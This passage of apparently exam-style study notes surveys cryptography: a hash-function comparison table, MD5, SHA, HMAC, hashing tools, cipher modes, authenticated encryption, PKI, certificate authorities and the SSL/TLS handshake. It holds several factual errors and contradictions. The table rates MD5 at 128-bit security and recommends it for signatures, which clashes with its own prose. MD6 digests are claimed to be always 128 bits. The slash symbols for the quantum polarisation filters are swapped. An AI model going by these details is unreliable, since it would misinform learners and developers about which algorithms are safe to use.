			- SHA (Secure Hash Algorithm)
	- Message Digest Functions:
		- The following list details message digest functions, including their output size, internal state size, block size, maximum message size, number of rounds, operations used, security level, and application areas:
			- MD2:
				- Output Size: 128 bits
				- Internal State Size: 128 bits
				- Block Size: 128 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 18
				- Operations: Permutation, Substitution
				- Security Level: 128 bits
				- Application Areas: Legacy applications, checksum validation
			- MD4:
				- Output Size: 128 bits
				- Internal State Size: 128 bits
				- Block Size: 512 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 48
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 128 bits
				- Application Areas: Obsolete, early cryptographic hash functions
			- MD5:
				- Output Size: 128 bits
				- Internal State Size: 128 bits
				- Block Size: 512 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 64
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 128 bits
				- Application Areas: File verification, checksum, digital signatures
			- MD6:
				- Output Size: 224, 256, 384, 512 bits
				- Internal State Size: 1024 bits
				- Block Size: 512 bits
				- Max Message Size: Unlimited
				- Rounds: Variable
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 128-256 bits
				- Application Areas: Cryptographic applications, data integrity
			- SHA-0:
				- Output Size: 160 bits
				- Internal State Size: 160 bits
				- Block Size: 512 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 80
				- Operations: Bitwise logical operations
				- Security Level: 0 bits (Obsolete)
				- Application Areas: Replaced by SHA-1
			- SHA-1:
				- Output Size: 160 bits
				- Internal State Size: 160 bits
				- Block Size: 512 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 80
				- Operations: Bitwise logical operations
				- Security Level: 80 bits
				- Application Areas: Legacy systems, software updates, TLS
			- SHA-2:
				- Output Size: 224, 256, 384, 512 bits
				- Internal State Size: 256, 512 bits
				- Block Size: 512, 1024 bits
				- Max Message Size: 2¹²⁸ bits
				- Rounds: 64, 80
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 112-256 bits
				- Application Areas: Secure applications, digital signatures, SSL
			- SHA-3:
				- Output Size: 224, 256, 384, 512 bits
				- Internal State Size: 1600 bits
				- Block Size: 1088, 576 bits
				- Max Message Size: Unlimited
				- Rounds: Variable
				- Operations: Sponge construction
				- Security Level: 128-256 bits
				- Application Areas: Secure hashing, cryptographic applications
			- RIPEMD-160:
				- Output Size: 160 bits
				- Internal State Size: 160 bits
				- Block Size: 512 bits
				- Max Message Size: 2⁶⁴ bits
				- Rounds: 160
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 160 bits
				- Application Areas: Cryptographic applications, data integrity
			- WHIRLPOOL:
				- Output Size: 512 bits
				- Internal State Size: 512 bits
				- Block Size: 512 bits
				- Max Message Size: 2²⁵⁶ bits
				- Rounds: 10
				- Operations: Matrix operations, substitution
				- Security Level: 256 bits
				- Application Areas: High-speed applications, checksum validation
			- Tiger:
				- Output Size: 192 bits
				- Internal State Size: 192 bits
				- Block Size: 512 bits
				- Max Message Size: Unlimited
				- Rounds: 24
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 192 bits
				- Application Areas: High-speed hashing, secure applications
			- BLAKE2:
				- Output Size: 256, 512 bits
				- Internal State Size: 256, 512 bits
				- Block Size: 512, 1024 bits
				- Max Message Size: Unlimited
				- Rounds: 10-14
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 128-256 bits
				- Application Areas: High-performance cryptographic applications
			- BLAKE3:
				- Output Size: 256 bits
				- Internal State Size: 256 bits
				- Block Size: 512 bits
				- Max Message Size: Unlimited
				- Rounds: Variable
				- Operations: Logical (AND, OR, XOR)
				- Security Level: 128-256 bits
				- Application Areas: Next-generation cryptographic functions
		- Message Digest Function: MD5 and MD6:
			- MD2, MD4, MD5, and MD6 are message digest algorithms used in digital signature applications to securely compress a document before the system signs it with a private key. These algorithms can process inputs of variable length, but the resulting message digest always has a fixed size of 128 bits. The structures of MD2, MD4, and MD5 appear similar, although MD2's design differs significantly from MD4 and MD5. MD2 supports 8-bit machines, while MD4 and MD5 are optimized for 32-bit machines.
			- These algorithms pad the message with extra bits to ensure that the total number of bits is divisible by 512. The extra bits may include a 64-bit representation of the message length.
			- Attacks on MD4 have become increasingly successful. Research has shown that an attacker can launch a full-version collision attack on MD4 within a minute on a typical PC. MD5 is slightly more secure but slower than MD4. However, both share the same message digest size and padding requirements. MD5 is a widely used cryptographic hash function that takes an input of arbitrary length and produces a 128-bit (16-byte) fingerprint or message digest. MD5 is commonly used for digital signatures, file integrity verification, and password storage. However, MD5 is not collision-resistant, making it unsuitable for modern security applications. Instead, more secure algorithms like MD6, SHA-2, and SHA-3 are recommended.
			- MD6 employs a Merkle-tree-like structure to enable large-scale parallel computation of hashes for very long inputs. It is resistant to differential cryptanalysis attacks. To evaluate the effectiveness of hash functions, one can analyze the output produced when the algorithm processes arbitrary input messages.
			- The following examples illustrate how even minor text differences generate radically different MD5 hashes:
				- echo “There is CHF1500 in the blue bo” | md5sum : e41a323bdf20eadafd3f0e4f72055d36
				- echo “There is CHF1500 in the blue box” | md5sum : 7a0da864a41fd0200ae0ae97afd3279d
				- echo “There is CHF1500 in the blue box.” | md5sum : 2db1ff7a70245309e9f2165c6c34999d
			- QuickHash-GUI (www.quickhash-gui.org):
				- QuickHash-GUI is a graphical data hashing tool available for Linux, Windows, and macOS. It allows users to hash segments of text or perform dynamic hashing as they type into the text field.
		- Message Digest Function: Secure Hashing Algorithm (SHA):
			- The National Institute of Standards and Technology (NIST) developed the Secure Hash Algorithm (SHA), which is specified in the Secure Hash Standard (SHS) and published as a Federal Information Processing Standard (FIPS PUB 180). It generates a cryptographically secure, one-way hash function. Although similar to the Message Digest (MD) family of hash functions developed by Ron Rivest, SHA offers enhanced security. While it is slightly slower than MD5, its larger message digest makes it more resilient to brute-force collision and inversion attacks.
			- SHA is not an encryption method but a family of cryptographic hash functions, currently categorized into three generations: SHA-1, SHA-2, and SHA-3.
				- SHA-0:
					- The original 160-bit hash function published in 1993 under the name SHA. It was withdrawn due to an undisclosed "significant flaw" and replaced with SHA-1, a slightly modified version.
				- SHA-1:
					- A 160-bit hash function similar to MD5, designed by the National Security Agency (NSA) as part of the Digital Signature Algorithm (DSA). It produces a 160-bit digest from a message of up to (2⁶⁴ − 1) bits. SHA-1 was widely used in security protocols like PGP, TLS, SSH, and SSL. However, due to cryptographic vulnerabilities, it was deprecated in 2010 and is no longer considered secure.
				- SHA-2:
					- A family of two related hash functions with different block sizes:
						- SHA-256: Uses 32-bit words
						- SHA-512: Uses 64-bit words
					- Truncated versions include SHA-224 (a reduced version of SHA-256) and SHA-384 (a reduced version of SHA-512).
				- SHA-3:
					- Unlike SHA-1 and SHA-2, SHA-3 uses sponge construction, where message blocks are XORed into the initial bits of the state before undergoing an invertible permutation. While SHA-3 supports the same hash lengths as SHA-2, it has a fundamentally different internal structure, making it more resistant to certain cryptographic attacks.
		- RIPEMD-160:
			- RACE Integrity Primitives Evaluation Message Digest (RIPEMD) is a 160-bit hash algorithm developed by Hans Dobbertin, Antoon Bosselaers, and Bart Preneel. There are also 128-, 256-, and 320-bit versions of this algorithm, called RIPEMD-128, RIPEMD-256, and RIPEMD-320, respectively. These versions replace the original RIPEMD, which was found to have a collision issue. However, they do not follow any standard security policies or guidelines.
			- RIPEMD-160 is a more secure version of the RIPEMD algorithm. Its compression function consists of 80 stages, divided into 5 blocks that each execute 16 times. This process is performed twice, with the results combined at the end using modulo 32 addition.
		- HMAC:
			- Hash-based Message Authentication Code (HMAC) is a type of message authentication code (MAC) that uses a cryptographic key along with a cryptographic hash function. It is widely used to verify the integrity of data and authenticate messages. This algorithm incorporates an embedded hash function such as SHA-1 or MD5. The security strength of HMAC depends on the embedded hash function, key size, and hash output size.
			- HMAC consists of two stages for computing the hash. The input key is processed to generate two keys: the inner key and the outer key.
				- In the first stage, the inner key and the message are used to produce an internal hash.
				- In the second stage, the output from the first stage is combined with the outer key to generate the final HMAC code.
			- Since HMAC executes the underlying hash function twice, it provides protection against various length extension attacks. The size of the key and output depends on the embedded hash function; for example, MD5 produces a 128-bit output, while SHA-1 produces a 160-bit output.
		- GOST - Hash Function:
			- The GOST hash algorithm was initially defined in the Russian national standard GOST R 34.11-94, titled “Information Technology – Cryptographic Information Security – Hash Function.”
			- It produces a fixed-length 256-bit output. The input message is divided into 256-bit blocks. If a block is smaller than 256 bits, the message is padded with zeros until it reaches 256 bits. The remaining bits are filled with a 256-bit integer arithmetic sum of all previously hashed blocks. Finally, a 256-bit integer representing the original message length (in bits) is added to complete the process.
	- Message Digest Function Calculators:
		- Message digest function calculators use various hash algorithms to convert plaintext into its corresponding hash value. Below are two such tools:
		- MD5 Calculator (www.bullzip.com):
			- MD5 Calculator is a simple application designed to compute the MD5 hash of a given file. It supports large files, even those several gigabytes in size. The tool features a progress counter and a text field from which the final MD5 hash can be easily copied to the clipboard.
			- MD5 Calculator is useful for verifying file integrity. To calculate an MD5 hash, simply right-click a file, select "MD5 Calculator", and the program will generate the hash. The MD5 Digest field will display the calculated value. To compare this hash with another, paste the second value into the Compare To field. If the values match, an equals sign (“=”) will appear between them; otherwise, a less-than (“<”) or greater-than (“>”) symbol will indicate a difference.
		- HashMyFiles (www.nirsoft.net):
			- HashMyFiles is a utility that calculates the MD5 and SHA1 hashes of one or more files on your system. It allows you to copy the generated hash values to the clipboard or save them in a text, HTML, or XML file.
			- Additionally, you can launch HashMyFiles directly from the Windows Explorer context menu to display the MD5 and SHA1 hashes of selected files or folders.
		- MD6 Hash Generator (www.browserling.com)
		- All Hash Generator (www.browserling.com)
		- md5 hash calculator (onlinehashtools.com)
		- Message Digester (www.freeformatter.com)
		- MD6 Hash Generator (www.atatus.com)
	- Multilayer Hashing Calculators:
		- Multilayer hashing, also known as nested hashing or recursive hashing, is a technique where a hash function is applied multiple times to the input or the output of a previous hash operation. This approach enhances security and creates more complex hash structures. Tools like CyberChef can perform multilayer hashing efficiently.
		- This process makes it significantly harder for attackers to reverse-engineer the original input data from the hash value. By adding multiple layers of hashing, brute-force attacks become more challenging due to increased computational complexity.
		- How Multilayer Hashing Works:
			- Initial Hashing:
				- The original input data (e.g., a message or file) is hashed using a cryptographic hash function such as SHA-256, SHA-3, or MD5.
				- This results in a fixed-size hash value, typically represented as a string of characters.
			- Subsequent Hashing:
				- The hash value from the initial step is hashed again using the same or a different hash function.
				- This process can be repeated multiple times, creating several hashing layers.
			- Final Hash Value:
				- After a predetermined number of iterations, the final hash value is generated.
				- This value serves as the output of the multilayer hashing process.
		- Steps to Perform Multilayer Hashing Using CyberChef:
			- Create a sample file and open CyberChef (CyberChef Online).
			- Click on "Open file as input" to upload the sample file.
			- Search for the desired hashing algorithm in the Operations panel (e.g., MD5) and drag it into the Recipe panel. The output appears in the Output panel.
			- Use the MD5 hash value as input, then select another hashing algorithm (e.g., SHA-1) and add it to the Recipe panel.
			- Repeat this process by selecting additional hashing algorithms (e.g., SHA-256, SHA-3) and applying them iteratively using the output of the previous hash as the input.
	- Hardware-Based Encryption:
		- Hardware-based encryption is a technique that utilizes computer hardware to assist or replace software during the data encryption process. Devices that implement encryption techniques through hardware are considered hardware-based encryption devices. In this approach, the cryptographic workload is offloaded to hardware processors, freeing up system resources for other tasks. These devices can also store encryption keys and other sensitive information in secure areas of RAM or nonvolatile storage devices such as flash memory.
		- Hardware encryption devices limit instruction sets, allowing only authorized code to be executed. They do not support third-party software, thereby preventing the execution of malicious programs. Hardware encryption offers several advantages over software encryption, including faster algorithm processing, tamper-resistant key storage, and enhanced protection against unauthorized code execution. Some examples of hardware-based encryption devices include wireless access points, Nitrokey, credit card terminals, and network bulk encryptors.
		- Types of Hardware Encryption Devices:
			- Trusted Platform Module (TPM):
				- A Trusted Platform Module (TPM) is a crypto-processor or chip embedded in the motherboard. It securely stores encryption keys and performs various cryptographic operations. TPM provides features such as platform integrity authentication, full disk encryption capabilities, password storage, and software license protection.
			- Hardware Security Module (HSM):
				- A Hardware Security Module (HSM) is an external security device used for crypto-processing, including the management, generation, and secure storage of cryptographic keys. HSMs enhance encryption computation, particularly for symmetric keys longer than 256 bits. High-performance HSM devices connect to networks using TCP/IP. Examples of HSM devices include Thales Luna Network HSM, nShield HSM, Utimaco HSM, and Cryptosec Dekaton PCI.
			- USB Encryption:
				- USB encryption is an additional security feature for USB storage devices, providing onboard encryption services. Encrypted USB devices require an on-device credential system or software- or hardware-based authentication from a computer. USB encryption protects against malware distribution via USB and helps prevent data loss and leakage. Examples of hardware USB-encrypted devices include Kingston IronKey D300S and diskAshur Pro.
			- Hard Drive Encryption:
				- Hard drive encryption technology encrypts stored data using various encryption methods. These devices do not use on-device keyboards or fingerprint readers; instead, they rely on TPMs or HSMs. Hard drive encryption devices can be installed as internal drives in computers. Examples include military-grade 256-bit AES hardware encryption and DiskCypher AES SATA hard drive encryption.
	- Quantum Cryptography:
		- As the world increasingly adopts online information sharing, cryptosystems are facing a sharp rise in security attacks. Traditional mathematical encryption relies on binary digits (0 and 1), making it vulnerable to eavesdropping and manipulation through various techniques. To counter these threats, quantum cryptography has been introduced, offering enhanced security against attacks such as man-in-the-middle (MITM) attacks.
		- Quantum cryptography is based on the principles of quantum mechanics, particularly quantum key distribution (QKD), which uses photons instead of mathematical algorithms for encryption. In this system, data elements are encrypted using a sequence of photons, each possessing a unique spin as they travel between the sender and receiver. These photons pass through different polarization filters—vertical, horizontal, backslash, and forward slash—which determine their binary value:
			- Horizontal (–): 0
			- Vertical (|): 1
			- Backslash (/): 1
			- Forward slash (\): 0
		- While attackers may attempt to eavesdrop, they cannot manipulate the data without detection. Since photons are transmitted through arbitrary filters, an attacker must correctly determine the exact polarization. Any incorrect measurement distorts the photon’s polarization, alerting the receiver to the eavesdropping attempt.
	- Other Encryption Techniques:
		- Homomorphic Encryption:
			- Homomorphic encryption differs from conventional encryption mechanisms, where mathematical operations are performed directly on encrypted plaintext. Homomorphic encryption allows users to keep their data secure and in an encrypted format even while it is being processed or manipulated. In this technique, encryption and decryption are performed by the same key holder. The homomorphic mechanism enables the user or sender to encrypt confidential data and outsource it to an enterprise via cloud services for processing.
			- How Homomorphic Encryption Differs from Other Encryption Mechanisms:
				- In private key encryption: Only key holders can generate and decrypt ciphertexts using the same key.
				- In public key encryption: The public key holder generates the ciphertext, while the secret key holder decrypts it.
				- In homomorphic encryption: The key holder generates the ciphertext, and anyone can manipulate the encrypted data. However, only the key holder can decrypt it.
			- The primary reason for using homomorphic encryption is that it allows an untrusted entity to process encrypted data without compromising its security. This mechanism ensures that only the sender can encrypt and decrypt the data while permitting mathematical operations to be performed on the ciphertext according to the rules defined by the sender.
		- Post-Quantum Cryptography:
			- Post-quantum cryptography, also known as quantum-resistant or quantum-proof cryptography, refers to advanced cryptographic algorithms (primarily public-key based) designed to protect security systems against attacks from both conventional and quantum computers. These algorithms can function alongside existing communication protocols and operating networks. Additionally, post-quantum cryptography can serve as a standalone encryption method, replacing current vulnerable cryptosystems while adhering to standard security policies.
			- Post-quantum cryptography aims to ensure secure, wide-range communication, secret-key processing, public-key-based signatures, and encryption for high-security applications such as secure e-voting. It includes various low-cost, secure systems commonly used in online communications. Ultimately, post-quantum cryptography is designed to prepare for the era of quantum computing by updating cryptographic algorithms and security standards.
		- Lightweight Cryptography:
			- A major challenge in modern cryptography is its application in low-powered devices. Researchers are working on developing compact, quantum-safe algorithms that can operate efficiently on resource-constrained devices. Most existing cryptographic algorithms are optimized for servers and desktops, whereas lightweight cryptography is designed for low-complexity applications such as RFID tags, sensor-based systems, and other IoT-based technologies.
			- The primary goal of lightweight cryptography is to minimize power and resource consumption without compromising security.
	- Cipher Modes of Operation:
		- Cipher modes of operation, also known as block cipher modes, are techniques used to encrypt fixed-length blocks of plaintext using a secret key. Some modes also incorporate an initialization vector (IV) to enhance security. These modes ensure both confidentiality and, in some cases, authenticity of data. The client and server securely exchange an encrypted symmetric key to facilitate encryption and decryption. Below are four common block cipher modes of operation, explaining how encryption at the source and decryption at the destination work.
		- Electronic Codebook (ECB) Mode:
			- ECB is the simplest block cipher mode of operation. In this mode, plaintext is divided into fixed-size blocks, which are then encrypted independently using the same secret key and block cipher encryption algorithm.
			- Encryption:
				- Each plaintext block is encrypted separately with the secret key, producing a corresponding ciphertext block.
				- This process is repeated for all plaintext blocks.
			- Decryption:
				- Each ciphertext block is decrypted using the same key and algorithm to retrieve the original plaintext block.
				- The process is repeated for all ciphertext blocks.
			- Weakness: If identical plaintext blocks appear in the input, they will produce identical ciphertext blocks, making it easier for attackers to detect patterns and infer information about the plaintext.
		- Cipher Block Chaining (CBC) Mode:
			- CBC improves upon ECB by introducing an initialization vector (IV) to ensure that identical plaintext blocks do not yield identical ciphertext blocks.
			- Encryption:
				- The first plaintext block is XORed with the IV before encryption.
				- The resulting ciphertext block is then XORed with the next plaintext block before encryption.
				- This chaining process continues until all plaintext blocks are encrypted.
			- Decryption:
				- The first ciphertext block is decrypted and then XORed with the IV to recover the plaintext.
				- For subsequent blocks, the previous ciphertext block is XORed with the decrypted output to retrieve the plaintext.
			- Weakness: A single-bit error in a ciphertext block affects not only its corresponding plaintext block but also the next block, leading to error propagation.
		- Cipher Feedback (CFB) Mode:
			- CFB operates in a way that converts a block cipher into a self-synchronizing stream cipher by using previous ciphertext blocks as input for encryption.
			- Encryption:
				- The IV is initially stored in a shift register and encrypted using the secret key.
				- A portion of the encryption output is XORed with the plaintext block to produce the ciphertext.
				- The ciphertext is then fed back into the shift register, and the process repeats for subsequent blocks.
			- Decryption:
				- The same process is followed, except that the received ciphertext block is XORed with the encryption output to retrieve the plaintext.
			- Advantage: CFB makes cryptanalysis more difficult and mitigates error propagation to some extent. However, it may still suffer from some data loss due to the shift register mechanism.
		- Counter (CTR) Mode:
			- CTR mode transforms a block cipher into a stream cipher by using a counter value instead of chaining previous ciphertext blocks.
			- Encryption:
				- A counter value is generated and encrypted using the secret key.
				- The encryption output is then XORed with the plaintext block to produce ciphertext.
				- The counter is incremented for each subsequent block.
			- Decryption:
				- The same counter values and secret key are used at the receiving end.
				- The encrypted counter values are XORed with the ciphertext to recover the plaintext.
			- Advantage: CTR mode does not suffer from error propagation and allows parallel processing since each block is independently encrypted and decrypted. However, both sender and receiver must maintain synchronized counter values.
	- Modes of Authenticated Encryption:
		- Authenticated encryption (AE) modes of operation provide both integrity and confidentiality for transmitted messages. In any cipher mode of operation, encryption and decryption are only possible with a shared secret key, preventing man-in-the-middle (MITM) attacks. However, an attacker can still attempt a chosen ciphertext attack to break the encryption scheme. AE addresses this vulnerability by incorporating a message authentication code (MAC) into the ciphertext. This prevents unauthorized modifications, as the AE scheme rejects improper ciphertexts during decryption.
		- Authenticated Encryption with Message Authentication Code (MAC):
			- A MAC is a value obtained by hashing a plaintext message using a shared secret key. It ensures message integrity, allowing the receiver to verify the message using the attached hash value. There are three main ways to use a MAC in encrypted messages:
			- Encrypt-then-MAC (EtM):
				- In this approach, the plaintext is first encrypted using a secret key. A MAC is then generated for the resulting ciphertext. The MAC is attached to the ciphertext before transmission. This method provides higher security compared to other AE approaches.
			- Encrypt-and-MAC (E&M):
				- In the E&M approach, a MAC is generated from the plaintext first. Then, the plaintext is encrypted using a secret key. Finally, both the ciphertext and the MAC are transmitted together.
			- MAC-then-Encrypt (MtE):
				- In this approach, a MAC is first generated from the plaintext using a hash function. The MAC is then appended to the plaintext, and the entire combination is encrypted using a secret key. This results in a ciphertext that contains the encrypted MAC.
		- Authenticated Encryption with Associated Data (AEAD):
			- AEAD is another method used to ensure both integrity and authenticity for messages containing encrypted and unencrypted data. This approach includes additional authenticated data (AAD) in the encryption process to prevent chosen ciphertext attacks. The message header remains unencrypted so the receiver can verify the message's source, while the payload is encrypted to ensure confidentiality.
	- Cryptography Tools:
		- You can use various cryptographic tools to encrypt and decrypt information, files, and other data. These tools implement different encryption algorithms to ensure security.
		- BCTextEncoder (www.jetico.com): The BCTextEncoder utility simplifies the encoding and decoding of text data. It compresses, encrypts, and converts plaintext into an encoded text format, which users can copy to the clipboard or save as a text file. It supports both public-key encryption and password-based encryption methods. Additionally, it employs strong, approved symmetric and public-key algorithms for secure data encryption.
		- CryptoForge (www.cryptoforge.com)
		- AxCrypt (axcrypt.net)
		- Microsoft Cryptography Tools (www.microsoft.com)
		- Concealer (www.belightsoft.com)
		- SensiGuard (www.sensiguard.com)
		- Cypherix (www.cypherix.com)
- Applications of Cryptography:
	- Cryptography plays a crucial role in securing communication and data across various domains. This section explores key applications of cryptography, including digital signatures, Secure Sockets Layer (SSL), Transport Layer Security (TLS), Pretty Good Privacy (PGP), email encryption, disk encryption, and blockchain.
	- Public Key Infrastructure (PKI):
		- Public Key Infrastructure (PKI) is a security framework designed to enhance the confidentiality of information exchanged over the insecure Internet. It encompasses the hardware, software, people, policies, and procedures necessary for creating, managing, distributing, using, storing, and revoking digital certificates. In cryptography, PKI helps bind public keys to corresponding user identities through a Certification Authority (CA).
		- Components of PKI:
			- Certificate Management System: Generates, distributes, stores, and verifies certificates.
			- Digital Certificates: Establish credentials for individuals performing online transactions.
			- Validation Authority (VA): Stores and verifies certificates, including their public keys.
			- Certification Authority (CA): Issues and verifies digital certificates.
			- End User: Requests, manages, and uses digital certificates.
			- Registration Authority (RA): Acts as a verifier for the CA.
		- PKI is a comprehensive system that enables the use of public-key encryption and digital signature services across various applications. PKI authentication relies on digital certificates (also known as public-key certificates) that CAs issue and sign. A digital certificate is a digitally signed statement that includes a public key and the subject's identity (user, company, or system).
		- PKI employs public-key cryptography, widely used on the Internet to encrypt messages and authenticate senders. In public-key cryptography, a CA generates a pair of public and private keys using the same algorithm simultaneously. The private key remains confidential and is held only by the certificate's subject (user, company, or system), while the public key is made accessible in a directory for all parties. The subject uses the private key to decrypt messages encrypted with the corresponding public key. Conversely, others encrypt messages using the subject’s public key, ensuring that only the intended recipient can decrypt them with their private key.
		- Steps in the PKI Process:
			- The subject (user, company, or system) applies for a certificate from the Registration Authority (RA) to securely exchange information.
			- The RA receives the request, verifies the subject’s identity, and forwards the request to the CA for issuing a public key certificate.
			- The CA issues the public key certificate, binding the subject’s identity to their public key, and updates the information with the Validation Authority (VA).
			- When the subject initiates a transaction, they digitally sign the message using their private key and send it to the recipient, including the public key certificate.
			- The recipient verifies the sender's authenticity by querying the VA regarding the validity of the public key certificate.
			- The VA compares the user’s public key certificate with the CA's updated information and determines whether the certificate is valid or invalid.
	- Certification Authorities:
		- Certification Authorities (CAs) are trusted entities that issue digital certificates. A digital certificate verifies the ownership of a public key by the subject (user, company, or system) specified in the certificate. This helps others trust signatures or statements made using the corresponding private key.
		- Some popular CAs are discussed below:
			- Comodo (www.comodoca.com): Comodo offers a range of PKI digital certificates with strong SSL encryption (128/256-bit) and Server-Gated Cryptography (SGC). It ensures confidentiality, system reliability, and compliance with industry standards through independent audits. Comodo also provides PKI management solutions such as Comodo Certificate Manager and Comodo EPKI Manager.
			- IdenTrust (www.identrust.com): IdenTrust is a trusted third-party CA serving various sectors, including banking, corporate enterprises, government, and healthcare. It offers solutions for digital signing and sealing, compliance with NIST SP 800-171, global identity networks, and managed PKI hosting services.
			- DigiCert CertCentral (www.digicert.com): CertCentral streamlines the entire certificate lifecycle by consolidating tasks such as issuing, installing, inspecting, remediating, and renewing TLS/SSL certificates. It efficiently manages high-volume TLS/SSL certificate issuance for multiple individuals and teams.
			- GoDaddy (www.godaddy.com): GoDaddy SSL Certificates comply with CA/Browser Forum guidelines and provide SHA-2 hash algorithm and 2048-bit encryption. They also offer protection for unlimited servers, ensuring robust security.
	- Signed Certificate (CA) vs. Self-Signed Certificate:
		- Signed Certificate:
			- As shown in the diagram above, the user obtains a digital certificate from a trusted Certificate Authority (CA). The digital certificate contains the name of the certificate holder, a serial number, expiration dates, a copy of the certificate holder's public key, and the digital signature of the CA. The user signs the document using their private key and sends it to the receiver. The receiver can verify the certificate by consulting a Validation Authority (VA), which confirms its validity.
		- Self-Signed Certificate:
			- As shown in the diagram above, the user creates a self-signed digital certificate using certificate creation tools such as Adobe Acrobat Reader, Java Keytool, or Apple’s Keychain. The certificate contains the user’s name, public key, and digital signature. The user signs the document using the self-signed certificate and sends it to the receiver. The receiver can verify the certificate by directly consulting the user, who confirms its authenticity.
	- Digital Signature:
		- A digital signature uses asymmetric cryptography to replicate the security properties of a handwritten signature in a digital format. It serves as a cryptographic method for authentication. Public-key cryptography, which employs asymmetric encryption, enables users to create digital signatures.
		- In public-key cryptography, there are two types of keys:
			- Private key: Known only to the signer, it is used to generate the digital signature.
			- Public key: Widely available, it is used by the recipient to verify the digital signature.
		- A hash function is an algorithm that plays a crucial role in creating and verifying a digital signature. This function generates a digital representation of the message, known as a message fingerprint or hash value. The hash value is significantly smaller than the original message but uniquely corresponds to it. If an attacker alters the message, the hash function will produce a completely different hash value, indicating tampering.
		- To verify a digital signature, the recipient requires the original message's hash value and the encryption algorithm used to generate the signature. Using the sender’s public key, the verifier ensures that the digital signature was created with the corresponding private key. Additionally, the verifier checks whether the computed hash value matches the original one.
		- For added security, a digital signature can be further protected by encrypting the signed email, ensuring confidentiality.
	- Secure Sockets Layer (SSL):
		- The Secure Sockets Layer (SSL) protocol is an application-layer protocol developed by Netscape to manage the security of message transmission on the Internet. It provides a secure authentication mechanism between two communicating applications, such as a client and a server. SSL requires a reliable transport protocol, such as TCP, for data transmission and reception. It uses RSA asymmetric (public-key) encryption to encrypt data transferred over SSL connections. Any application-layer protocol, such as HTTP, FTP, or Telnet, can operate over SSL transparently. SSL acts as an intermediary between the encryption algorithm and the session key while also verifying the destination server before data transmission and reception. SSL encrypts the entire application protocol's data to ensure security.
		- SSL also offers "channel security" with three basic properties:
			- Private channel: All messages are encrypted after a handshake establishes a shared secret key.
			- Authenticated channel: The server endpoint of the conversation is always authenticated, while the client endpoint is optionally authenticated.
			- Reliable channel: Message transfer includes an integrity check.
		- SSL employs both asymmetric and symmetric encryption mechanisms. Public-key encryption verifies the identities of the server, client, or both. Once authentication occurs, the client and server generate symmetric keys, enabling rapid and secure data communication. An SSL session executes the SSL handshake protocol to synchronize the states of the server and client, ensuring protocol consistency.
		- SSL Handshake Protocol Flow:
			- The SSL handshake protocol operates on top of the SSL record layer. The steps of the handshake process are as follows:
				- The client sends a hello message to the server. The server must respond with a hello message; otherwise, the connection will fail due to a fatal error. The client and server hello messages establish attributes such as protocol version, session ID, cipher suite, and compression method.
				- Once the connection is established, the server sends a certificate to the client for authentication. The server may also send a server key exchange message. After authenticating the server, it may request a certificate from the client (if required by the selected cipher suite).
				- The server sends a hello done message, signaling the end of its handshake process, and waits for the client’s response.
				- If the client receives a certificate request message, it must respond with either a certificate message or a no certificate alert. The client then sends a client key exchange message. The content of this message depends on the public-key algorithm used. If the client’s certificate has signing capabilities, a digitally signed certificate verifies the message before transmission.
				- The client transmits the change cipher spec message and applies the pending cipher specification to the current session. It then sends a message indicating that all future communication will use the newly established encryption parameters.
				- The server responds with its own change cipher spec message, applies the pending cipher specification, and finalizes the encryption settings. At this point, the handshake is complete, and the server begins exchanging application-layer data with the client.
		- Session Resumption and Replication:
			- Resuming a previous session or replicating an existing session follows this process:
				- The client initiates communication by sending a hello message with the session ID of the session it wants to resume.
				- If the server recognizes the session ID, it re-establishes the session using the same session state.
				- The server and client then exchange change cipher spec messages and proceed directly to the finished messages.
				- Once re-established, the server and client resume data exchange at the application layer.
				- If the session ID is not recognized, the server generates a new session ID, and the SSL client and server perform a complete handshake.
	- Transport Layer Security (TLS):
		- Transport Layer Security (TLS) is a cryptographic protocol used to establish a secure connection between a client and a server, ensuring the privacy and integrity of transmitted information. It employs symmetric encryption for bulk data encryption, asymmetric encryption for authentication and key exchange, and message authentication codes (MACs) for verifying message integrity. The RSA algorithm, with key strengths of 1024 and 2048 bits, is commonly used in TLS. By implementing TLS, security risks such as message tampering, forgery, and interception can be mitigated. One key advantage of TLS is its independence from the application protocol, allowing higher-level protocols to operate transparently on top of it.
		- TLS consists of two primary layers: the TLS Record Protocol and the TLS Handshake Protocol.
			- TLS Record Protocol:
				- The TLS Record Protocol is a layered protocol that ensures secure communication using encryption algorithms such as DES. It secures application data with keys generated during the handshake process and verifies the integrity and origin of transmitted messages.
				- The TLS Record Protocol provides connection security through two fundamental properties:
					- Privacy: Symmetric cryptography (e.g., DES) is used for data encryption. Unique keys for symmetric encryption are generated for each connection, based on a secret negotiated by another protocol, such as the TLS Handshake Protocol. TLS can operate without encryption if necessary.
					- Reliability: The protocol ensures message integrity by using a keyed MAC. Secure hash functions, such as SHA and MD5, are used for MAC computations.
				- The TLS Record Protocol performs the following tasks:
					- Fragments outgoing data into manageable blocks and reassembles incoming data.
					- Optionally compresses outgoing data and decompresses incoming data.
					- Applies a MAC to outgoing data and verifies incoming data using the MAC.
					- Encrypts outgoing data and decrypts incoming data.
				- After processing, the TLS Record Protocol sends encrypted data to the TCP layer for transport.
			- TLS Handshake Protocol:
				- The TLS Handshake Protocol enables mutual authentication between the client and server while negotiating encryption algorithms and cryptographic keys before data exchange.
				- It provides connection security through three key properties:
					- Peer Authentication: Asymmetric cryptography is used to authenticate one or both parties. Authentication is optional but typically required for at least one peer.
					- Secure Key Exchange: A shared secret is securely negotiated.
					- Reliability: The negotiation process is protected against attacks and manipulation.
				- Operating on top of the TLS Record Protocol, the TLS Handshake Protocol establishes cryptographic parameters for the session state. At the beginning of communication, the TLS client and server agree on a protocol version, select cryptographic algorithms, authenticate each other (if required), and use asymmetric cryptography to generate shared secrets.
				- Steps of the TLS Handshake Protocol:
					- The client sends a "Client Hello" message containing a random value and a list of supported cipher suites to the server.
					- The server responds with a "Server Hello" message, including its random value.
					- The server sends its certificate to the client for authentication and may optionally request the client’s certificate. The server then sends a "Server Hello Done" message.
